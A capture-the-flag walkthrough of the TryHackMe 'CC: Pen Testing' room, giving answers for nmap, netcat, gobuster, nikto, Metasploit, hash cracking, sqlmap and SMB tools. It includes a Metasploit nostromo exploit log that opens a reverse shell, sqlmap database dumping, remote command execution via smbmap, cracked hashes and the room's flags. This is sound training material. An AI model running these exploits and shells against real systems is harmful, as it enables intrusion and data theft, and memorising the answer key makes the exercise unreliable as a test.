# THM CC: Pen Testing

  

  

  

### In this writeup Today we're going to try to Solve a room in THM called [CC: Pen Testing](https://tryhackme.com/room/ccpentesting)

  

  

  

## Task 1

  

  

This Section is a Introduction about the room

  

  

  

**no answer needed**

  

  

______

  

  

## Task 2 (Nmap)

  

  

This Section Called Nmap in this Section You Will Use Nmap to Scan & Recon The Machine

  

  

Nmap is one of the most important tools for pentesting, if you don't know Nmap use **man command in linux** or **you can ask google**

  

search bro

  

![enter image description here](https://media.giphy.com/media/xGdvlOVSWaDvi/giphy.gif)

  

  

`$ man nmap `

  

  

![Man Nmap](https://res.cloudinary.com/micro0x00/image/upload/v1615225214/Screenshot_2021-03-08_192242_asg6li.png)

  

  

It will show you everything about nmap

  

____

  

#1. **What does nmap stand for ?**

  

  

  

answer : **Network Mapper**

  

  

__________________

  

  

  

#2. **How do you specify which port(s) to scan ?**

  

  

  

answer : **-p**

  

  

__________________

  

  

  

#3. **How do you do a "ping scan"(just tests if the host(s) is up) ?**

  

  

  

answer: **-sn**

  

  

__________________

  

  

  

#4. **What is the flag for a UDP scan ?**

  

  

  

![udp scan flag](https://res.cloudinary.com/micro0x00/image/upload/v1615226720/udp_uoyu1k.png)

  

  

  

answer: **-sU**

  

  

__________________

  

  

  

#5. **How do you run default scripts ?**

  

  

  

![default script](https://res.cloudinary.com/micro0x00/image/upload/v1615227012/sc_ied8ds.png)

  

  

  

answer: -**sC**

  

  

__________________

  

  

  

#6. **How do you enable "aggressive mode"(Enables OS detection, version detection, script scanning, and traceroute) ?**

  

  

  

![enable aggressive mode](https://res.cloudinary.com/micro0x00/image/upload/v1615227295/_a_ggxvew.png)

  

  

  

answer : **-A**

  

  

__________________

  

  

#7. **What flag enables OS detection ?**

  

  

  

![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1615239877/-O_loldqt.png)

  

  

  

answer : **-O**

  

  

_______________________

  

  

#8. **How do you get the versions of services running on the target machine**

  

  

  

answer : **-sV**

  

  

_________________________

  

  

#9. **Deploy the machine**

  

  

  

answer : **(Deploy the machine (No answer needed )**

  

  

after that run `$ nmap -A -sC -sV -O <IP Address>`

  

  

  

![the scan](https://res.cloudinary.com/micro0x00/image/upload/v1615274991/ths_scan_fsxmjf.png)

  

  

_____________________________

  

  

#10. **How many ports are open on the machine ?**

  

  

  

answer : **1**

  

  

__________________________

  

  

#11. **What service is running on the machine ?**

  

  

  

answer : **apache**

  

  

______________________________________________

  

  

#12. **What is the version of the service ?**

  

  

  

answer : **2.4.18**

  

  

________________

  

  

#13. **What is the output of the http-title script(included in default scripts) ?**

  

  

  

answer : **Apache2 Ubuntu Default Page: It Works**

  

  

____________

  

  

## Task 3 (NetCat)

  

  

This Section Called NetCat in this Section You Will Use NetCat it's allows users to connect to specific ports and send and receive data

  

  

if you don't know it you can use **man command in linux** or **you can ask google**

  

  

  

![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1615275369/Nc_datqrb.png)

  

  

____________________________

  

  

#1. **How do you listen for connections ?**

  

  

  

answer: **-l**

  

  

____________________

  

  

#2. **How do you enable verbose mode(allows you to see who connected to you) ?**

  

  

  

answer: **-v**

  

  

______________

  

  

#3. **How do you specify a port to listen on ?**

  

  

  

answer : **-p**

  

  

_________________

  

  

#4. **How do you specify which program to execute after you connect to a host(One of the most infamous) ?**

  

  

  

answer : **-e**

  

  

___

  

  

#5. **How do you connect to udp ports ?**

  

  

  

answer **-u**

  

  

__________________________

  

  

## Task 4 (gobuster)

  

  

you can download gobuster form [here](https://github.com/OJ/gobuster)

  

  

gobuster can tell you where some files and directories are; however, some of the more hidden stuff is often hidden away from the eyes of users.

  

  

____

  

  

#1. **How do you specify directory/file brute forcing mode ?**

  

  

  

answer : **dir**

  

  

_________

  

  

#2. **How do you specify dns bruteforcing mode ?**

  

  

  

answer : **dns**

  

  

______

  

  

#3. **What flag sets extensions to be used ?**

  

  

  

answer : **-x**

  

  

_______

  

  

#4. **What flag sets a wordlist to be used ?**

  

  

  

answer : **-w**

  

  

________

  

  

#5. **How do you set the Username for basic authentication ?**

  

  

  

answer : **-u**

  

  

_______

  

  

#6. **How do you set the Password for basic authentication ?**

  

  

  

answer : **-p**

  

  

___________________

  

  

#7. **How do you set which status codes gobuster will interpret as valid ?**

  

  

  

answer : **-s**

  

  

________________

  

  

#8. **How do you skip ssl certificate verification ?**

  

  

  

answer : **-K**

  

  

___________________

  

  

#9.**How do you specify a User-Agent ?**

  

  

  

answer : **-A**

  

  

_______________________

  

  

#10. **How do you specify a HTTP header ?**

  

  

  

answer : **-h**

  

  

__________________

  

  

#11. **What flag sets the URL to bruteforce ?**

  

  

  

answer : **-u**

  

  

________________________

  

  

#12. **Deploy the machine**

  

  

  

answer : **no answer needed**

  

  

_____________

  

  

#13. **What is the name of the hidden directory ?**

  

  

  

`$ sudo gobuster dir -u http://10.10.238.53 -w /usr/share/wordlists/dirb/common.txt -t 64 -x xxa`

  

  

![gobuster](https://res.cloudinary.com/micro0x00/image/upload/v1615286314/gobuster_x25mvh.png)

  

  

  

answer : **secret**

  

  

__________

  

#14. **What is the name of the hidden file with the extension xxa ?**

  

  

  

answer : **password**

  

  

_________________

  

  

## Task 5 (Nikto)

  

  

nikto is a popular web scanning tool that allows users to find common web vulnerabilities. It is commonly used to check for common CVE's such as shellshock, and to get general information about the web server that you're enumerating.

  

  

use man command to know about it

  

  

`$ man nikto`

  

  

  

________

  

  

#1. **How do you specify which host to use ?**

  

  

  

answer : **-h**

  

  

____________________

  

  

#2. **What flag disables ssl?**

  

  

  

answer : **-nossl**

  

  

____________

  

  

#3. **How do you force ssl?**

  

  

  

answer : **-ssl**

  

  

______

  

  

#4 **How do you specify authentication(username + pass)?**

  

  

  

answer : **-id**

  

  

__________________

  

  

#5. **How do you select which plugin to use?**

  

  

answer : **-plugins**

  

  

___________________________________

  

  

#6. **Which plugin checks if you can enumerate apache users ?**

  

  

run `└─ $ nikto --list-plugins`

  

  

  

![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1615288529/nako_duiykl.png)

  

  

  

answer : **apacheusers**

  

  

______________________

  

  

#7. **How do you update the plugin list ?**

  

  

  

answer : **-update**

  

  

_____

  

  

  

#8. **How do you list all possible plugins to use ?**

  

  

  

answer : **--list-plugins**

  

  

______

  

  

## Task 6 (Metasploite intro)

  

  

#1.

Metasploit is one of the most popular penetration testing frameworks around. It contains a large database of almost every major CVE, which you can easily use against a machine. The aim of this section is to go through some of the major features of metasploit, and at the end there will be a machine that you will need to exploit.

  

  

  

**No answer needed**

  

______________________

  

  

## Task 7 (Metasploite Setting up)

  

  

#1. **What command allows you to search modules?**

  

  

  

answer : **search**

  

______________________

  

  

  

#2.**How do you select a module?**

  

  

  

answer : **use**

  

  

______________________

  

  

#3.** How do you display information about a specific module?**

  

  

  

answer : **info**

  

  

______________________

  

  

#4. **How do you list options that you can set ?**

  

  

answer : **options**

  

  

_____

  

  

#5. **What command lets you view advanced options for a specific module ?**

  

  

  

answer: **advanced**

  

  

______

  

  

#6. **How do you show options in a specific category ?**

  

  

  

answer : **show**

  

  

_______________________

  

  

## Task 8 (MetaSploite Selecting a module)

  

  

Once you have found the module for the specific machine that you want to exploit, you need to select it and set the proper options. This task will take you through selecting and setting options for one of the most popular metasploit modules "eternalblue". All basic commands that could be run before selecting a module can also be done while a module is selected.

  

  

![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1615371257/meta1_lzenqg.png)

  

_________

  

  

#1. **How do you select the eternalblue module?**

  

  

answer : **use exploit/windows/smb/ms17_010_eternalblue**

  

__________

  

#2. **What option allows you to select the target host(s)?**

  

  

answer : **RHOSTS**

  

_______

  

#3. **How do you set the target port ?**

  

  

answer : **RPORT**

  

_______

  

#4. **What command allows you to set options ?**

  

  

answer : **set**

  

_____

  

#5. **How would you set SMBPass to "username"?**

  

  

answer : **set SMBPass username**

  

______

  

#6. **How would you set the SMBUser to "password"?**

  

  

answer : **set SMBUser password**

  

______

  

#7. **What option sets the architecture to be exploited ?**

  

  

answer : **arch**

  

________

  

#8. **What option sets the payload to be sent to the target machine ?**

  

  

answer : **payload**

  

_______

  

#9. **Once you've finished setting all the required options, how do you run the exploit ?**

  

  

*answer* : **exploit**

  

  

_______

  

#10 **. What flag do you set if you want the exploit to run in the background ?**

  

answer: **-j**

  

  

_________

  

#11. **How do you list all current sessions ?**

  

  

answer : **sessions**

  

  

__________

  

#12. **What flag allows you to go into interactive mode with a session("drops you either into a meterpreter or regular shell")**

  

  

answer : **-i**

  

__________

  

## Task 9 (Metasploite Meterpreter)

  

Once you've run the exploit, ideally it will give you one of two things, a regular command shell or a meterpreter shell. Meterpreter is metasploits own "control center" where you can do various things to interact with the machine. A list of commonmeterpreter commands and their uses can be found [here](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)

  

  

![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1615445291/Screenshot_2021-03-11_004014_o1jdvp.png)

  

____

  

#1. **What command allows you to download files from the machine ?**

  

answer : **download**

  

______

  

#2. **What command allows you to upload files to the machine?**

  

answer : **upload**

  

__________

  

#3. **How do you list all running processes ?**

  

  

answer : **ps**

  

____________

  

#4. **How do you change processes on the victim host(Ideally it will allow you to change users and gain the perms associated with that user) ?**

  

  

answer : **migrate**

  

_________

  

#5. **What command lists files in the current directory on the remote machine?**

  

  

answer : **ls**

  

_________

  

#6. **How do you execute a command on the remote host?**

  

  

answer : **execute**

  

___________

  

#7. **How do you find files on the target host(Similar function to the linux command "find")**

  

  

answer : **search**

  

_________

  

  

#8. **How do you get the output of a file on the remote host ?**

  

  

answer : **cat**

  

_______

  

#9. **How do you put a meterpreter shell into "background mode"(allows you to run other msf modules while also keeping the meterpreter shell as a session)?**

  

  

answer : **background**

  

________________________

  

  

## Task 10 (Metasploite Final Walkthrough)

  

in this task will exploite the machine

  

_________

  

  

![enter image description here](https://media.giphy.com/media/JIX9t2j0ZTN9S/giphy.gif)

  

  

`msf5 exploit(multi/http/nostromo_code_exec) > set RPORT 80`

  

`RPORT => 80`

  

`msf5 exploit(multi/http/nostromo_code_exec) > set RHOSTS10.10.125.158`

  

`RHOSTS => 10.10.125.158`

  

`msf5 exploit(multi/http/nostromo_code_exec) > set LHOST 10.2.68.221`

  

`LHOST => 10.2.68.221`

  

`msf5 exploit(multi/http/nostromo_code_exec) > run`

  

`[*] Started reverse TCP handler on 10.2.68.221:4444`

  

`[*] Configuring Automatic (Unix In-Memory) target`

  

`[*] Sending cmd/unix/reverse_perl command payload`

  

`[*] Command shell session 1 opened (10.2.68.221:4444 -> 10.10.125.158:51754) at 2021-3-2 07:12:44-0400`

`shell`

`id`

  

  

________

  

  

#1. **Select the module that needs to be exploited**

  

  

answer : `use exploit/multi/http/nostromo_code_exec`

  

  

__________

  

#2. **What variable do you need to set, to select the remote host**

  

  

answer : **rhosts**

  

_________

  

#3 **How do you set the port to 80**

  

  

answer : **set port**

  

  

_________________

  

#4. **How do you set listening address(Your machine)?**

  

  

answer : **lhost**

  

_________

  

#5. **Exploit the machine!**

  

_____________

  

#6. **What is the name of the secret directory in the /var/nostromo/htdocs directory ?**

  

  

![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1615446215/final_meta_dwwqkx.png)

  

  

answer : **s3cretd1r**

  

___________

  

#7. **What are the contents of the file inside of the directory ?**

  

  
  

`$ cd s3cretdir`

  

`$ ls`

  

`nice`

  

`$ cat nice`

  

`Woohoo!`

  

answer : **Woohoo**!

  

_______________

  

## Task 11 (Hash Cracking: Intro)

  

  

I want to say the important thing is that there are many ways to crack the hash you can use a website,brute force tool it's the same result no problem

  

Often times during a pen test, you will gain access to a database. When you investigate the database you will often find a users table, which contains usernames and often [hashed passwords](https://www.wired.com/2016/06/hacker-lexicon-password-hashing/). It is often necessary to know how to crack hashed passwords to gain authentication to a website(or if you're lucky a hashed password may work for ssh!).

  

________

  

## Task 12 (Hash Cracking]: Salting and Formatting)

  

  

**No answer needed**

  

______________

  

## Task 13 (Hash Cracking): hashcat

  

hashcat is another one of the most popular hash cracking tools. It is renowned for its versatility and speed. Hashcat does not have auto detection for hashtypes, instead it has modes. For example if you were trying to crack an md5 hash the "mode" would be 0, while if you were trying to crack a sha1 hash, the mode would be 100.

  

A full list of all modes can be found [here](https://hashcat.net/wiki/doku.php?id=example_hashes).

  

  

![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1615456693/%D8%A7%D8%AA%D8%B4_oo5mma.png)

  

__________

  

#1. **What flag sets the mode ?**

  

answer : -m

  

_________

  

#2. **What flag sets the "attack mode"**

  

answer : **-a**

  

_________

  

#3. **What is the attack mode number for Brute-force**

  

answer: **3**

  

_______

  

#4, **What is the mode number for SHA3-512**

  

answer : **17600**

  

_______

  

#5. Crack This Hash:**56ab24c15b72a457069c5ea42fcfc640**

  

type : MD5

  

![https://res.cloudinary.com/micro0x00/image/upload/v1615453366/hash1_sadws6.png](https://res.cloudinary.com/micro0x00/image/upload/v1615453366/hash1_sadws6.png)

  

You can user this [site](https://crackstation.net/)

  

answer : happy

  

______

  

Crack this hash: **4bc9ae2b9236c2ad02d81491dcb51d5f**

answer : **nootnoot**
  

  

Type: MD4

  

___

## Task 14 - (Hash Cracking): John The Ripper

John The Ripper(jtr) is one of the best hash cracking tools available. It supports numerous formats of hashes and is extremely easy to use, while having a lot of options for customization.

  

Note: There are multiple variations of jtr out there. For this task the version that comes pre-installed on kali will be used

  

Note 2: All hashes can be cracked with rockyou.txt

Download From [here](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)

___

#1.**What flag let's you specify which wordlist to use?**

  

answer : **--wordlist**

______

#2, **What flag lets you specify which hash format(Ex: MD5,SHA1 etc.) to use?**

  

answer : **-format**

_____

#3. ** How do you specify which rule to use?**

  

answer : **--rules**

______

**Crack this hash: 5d41402abc4b2a76b9719d911017c592**

  

Type: MD5

Note : as I told you, you can use more than one way to crack the hash. This hash is easy, so I will find it in the **[crack station](https://crackstation.net/)**

  

answer : **hello**

  

_____

**Crack this hash: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8**

  

Type: SHA1

  

answer : **password**

_____

## Task 15 (SQL Injection): Intro

**no answer need**

________

## Task 16 - ( SQL Injection): sqlmap

  

  

#1. **How do you specify which url to check?**

  

answer :**-u**

  

______

  

#2. **What about which google dork to use?**

  

answer: **-g**

  

  

______

  

#3. **How do you select(lol) which parameter to use?(Example: in the url http://ex.com?test=1 the parameter would be test.)**

  

answer : **-p**

  

_______

  

#4. **What flag sets which database is in the target host’s backend? (Example: If the flag is set to mysql then sqlmap will only test mysql injections)**

  

answer: **--dbms**

  

______

  

#5. **How do you select the level of depth sqlmap should use? (Higher = more accurate and more tests in general)**

  

answer : **--level**

  

_____

  

#6. **How do you dump the table entries of the database?**

  

answer :**--dump**

  

_______

  

#7. **Which flag sets which db to enumerate? (Case sensitive)**

  

answer: **-D**

  

______

  

#8. **Which flag sets which table to enumerate? (Case sensitive)**

  

answer: **-T**

_______

## Task 17 (SQL Injection): Note on Manual SQL Injection

  

No answer needed

_________

## Task 18 (SQL Injection): Vulnerable Web Application

#1. **Set the url to the machine ip, and run the command**

  

**no answer needed**

  

__________

#2. **How many types of sqli is the site vulnerable to ?**

  

answer : **3**

__________

#3. **Dump the database**

  

**no answer needed**

`sqlmap -u http://<Maching ip> --forms --dump`
__________

#4. **What is the name of the database ?**



![sql injection](https://res.cloudinary.com/micro0x00/image/upload/v1615542445/sql_teez_gqtkmi.png)

answer : **tests**

________

#5. **How many tables are in the database ?**

  

answer : **2**

_________

#6. **What is the value of the flag ?**

  

answer **found_me**

___________

## Task 20 (Samba) smbmap

Continuing with the trend of tools having "map" in the name being extremely popular, smbmap is one of the best ways to enumerate samba. smbmap allows pen-testers to run commands(given proper permissions), download and upload files, and overall is just incredibly useful for smb enumeration.

_________

#1. **How do you set the username to authenticate with?**

  

answer : **-u**

______

#2. **What about the password?**

  

answer : **-p**

_________

#3. **How do you set the host?**

  

answer : **-h**

________

#4. **What flag runs a command on the server(assuming you have permissions that is)?**

  

answer : **-x**

_______

#5. **How do you specify the share to enumerate?**

  

answer : **-s**

________

#6. **How do you set which domain to enumerate?**

  

answer : **-d**

________

#7. **What flag downloads a file?**

  

answer : **--download**

______

#8.**What about uploading one?**

  

answer : **--upload**

________

#9. **Given the username "admin", the password "password", and the ip "10.10.10.10", how would you run ipconfig on that machine**

  

answer : **smbmap -u "admin" -p "password" -H 10.10.10.10 -x "ipconfig"**

________

## Task 21 (Samba): smbclient

smbclient allows you to do most of the things you can do with smbmap, and it also offers you and interactive prompt.

_______

#1. **How do you specify which domain(workgroup) to use when connecting to the host?**

  

answer : **-w**

_______

#2. **How do you specify the ip address of the host?**

  

answer : **-l**

______

#3. **How do you run the command "ipconfig" on the target machine?**

  

answer :**-c "ipconfig"**

__________

#4. **How do you specify the username to authenticate with?**

  

answer : **-U**

__________

#5. **How do you specify the password to authenticate with?**

  

answer : **-P**

_____________

#6. **What flag is set to tell smbclient to not use a password?**

  

answer : **-N**

________

#7. **While in the interactive prompt, how would you download the file test, assuming it was in the current directory?**

  

answer : **get test**

  

_________

#8. **In the interactive prompt, how would you upload your /etc/hosts file**

  

answer : **put /etc/hosts**

___________________
## Task 22 (Samba): A note about impacket

**no answer needed**
__________
## Task 23 (Miscellaneous): A note on privilege escalation

**no answer needed**
______
## Task 24 (Final Exam): Good Luck :D
let's goo

**What is the user.txt**

okay we will see the hint  

![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1615558766/hint_bmn2fo.png)

He is referring to the hidden dir that you found by gobuster
that : /secret

we have to use search the directory with gobuster tool 

lets search
 `gobuster dir -u  http://Machinieip -w /usr/share/wordlists/dirb/common.txt -t 64`

![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1615558988/the_buster_man_agsbcc.png)

Now we will search for a file with multiple extensions in this directory

`gobuster dir -u  http://10.10.208.250/secret -w /usr/share wordlists/dirb/common.txt -t 64 -x .txt,.html,.pdf`

![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1615559813/beeeeeeeeed_qvvojr.png)

and we found it 

Note : the ip of the machine has been changed because the machine was turned off 

let's go to the 

http://10.10.208.250/secret/secret.txt
![pics](https://res.cloudinary.com/micro0x00/image/upload/v1615560558/secreooo_gr9q83.png)

and we find that

**nyan:046385855FC9580393853D8E81F240B66FE9A7B8**

This is hash 

![hash](https://res.cloudinary.com/micro0x00/image/upload/v1615560855/Screenshot_2021-03-12_165328_ikuyuc.png)

okay decrypt it by any tool
john - hashcat - website as you like 

i will use the faster way and search it in crack station

and i found it 
![decrypt](https://res.cloudinary.com/micro0x00/image/upload/v1615561115/done_xbh44q.png)

046385855FC9580393853D8E81F240B66FE9A7B8 = nyan

We have not reached anything so let's check the services and port activated in the machine by Nmap

![](https://res.cloudinary.com/micro0x00/image/upload/v1615561537/proof_loxzwl.png)

found 2 ports: 22,80 


 i think ssh is running in the machine

![](https://res.cloudinary.com/micro0x00/image/upload/v1615561538/proof2_rrakec.png)

let's connect 

password is the hash value

![](https://res.cloudinary.com/micro0x00/image/upload/v1615561478/ssh_hyqx4c.png)

the user flag is supernootnoot
_______
**What is the root.txt**


![](https://res.cloudinary.com/micro0x00/image/upload/v1615561972/prrrrrrrrrrrrrof_z7yxdg.png)

root flag is : congratulations!!!!

![](https://media.giphy.com/media/Kd03ofSatuwMXgJcuz/giphy.gif)

